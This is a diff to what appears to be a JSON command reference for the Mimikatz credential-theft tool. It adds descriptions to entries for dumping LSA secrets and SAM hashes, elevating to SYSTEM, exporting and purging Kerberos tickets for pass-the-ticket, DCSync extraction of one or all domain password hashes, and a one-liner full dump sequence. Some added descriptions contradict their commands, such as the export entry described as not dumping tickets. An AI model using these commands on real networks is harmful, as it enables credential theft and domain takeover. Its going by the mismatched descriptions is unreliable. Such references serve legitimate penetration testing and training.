@@ -30,42 +30,50 @@
     {
       "command": "lsadump::lsa /patch",
       "caption": "Dump LSA secrets - often reveals service account credentials in cleartext",
-      "label": "lsadump::lsa"
+      "label": "lsadump::lsa",
+      "description": "Dumps LSA secrets including service account passwords, cached domain credentials, and computer account passwords from the local security database."
     },
     {
       "command": "token::elevate",
       "caption": "Impersonate SYSTEM token from local admin context",
-      "label": "token::elevate"
+      "label": "token::elevate",
+      "description": "Impersonates a SYSTEM token using Mimikatz. Escalates the current session to NT AUTHORITY\\SYSTEM for operations requiring the highest local privilege."
     },
     {
       "command": "kerberos::purge",
       "caption": "Purge all Kerberos tickets from current session (clean slate before PTT)",
-      "label": "kerberos::purge"
+      "label": "kerberos::purge",
+      "description": "Purges all Kerberos tickets from the current session. Clears cached tickets before injecting a forged or stolen ticket to avoid conflicts."
     },
     {
       "command": "kerberos::list /export",
       "caption": "List and export all Kerberos tickets to disk (.kirbi files)",
-      "label": "kerberos::list"
+      "label": "kerberos::list",
+      "description": "Lists all Kerberos tickets cached in the current logon session. Shows TGTs and service tickets without dumping them from LSASS."
     },
     {
       "command": "misc::cmd",
       "caption": "Spawn a new cmd.exe with current mimikatz token context",
-      "label": "misc::cmd"
+      "label": "misc::cmd",
+      "description": "Spawns a new command prompt from within Mimikatz. Opens a cmd.exe that inherits the tokens and tickets loaded in the current Mimikatz session."
     },
     {
       "command": "lsadump::dcsync /user:Administrator",
       "caption": "DCSync - dump specific user hash from DC replication (requires domain admin or replication rights)",
-      "label": "DCSync - one user"
+      "label": "DCSync - one user",
+      "description": "Performs DCSync by simulating a domain controller replication request (DRSUAPI). Extracts password hashes for any account from the DC without running code on it - requires DA or replication privileges."
     },
     {
       "command": "lsadump::dcsync /domain:<domain> /all /csv",
       "caption": "DCSync - dump all domain hashes as CSV",
-      "label": "DCSync - whole domain (CSV)"
+      "label": "DCSync - whole domain (CSV)",
+      "description": "Performs DCSync by simulating a domain controller replication request (DRSUAPI). Extracts password hashes for any account from the DC without running code on it - requires DA or replication privileges."
     },
     {
       "command": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"lsadump::lsa /patch\" \"exit\"",
       "caption": "One-liner: full dump sequence from cmd.exe",
-      "label": ".\\mimikatz.exe"
+      "label": ".\\mimikatz.exe",
+      "description": "Extracts password hashes from the local SAM database. Dumps NTLM hashes for all local user accounts on the machine."
     }
   ],
   "examples": [
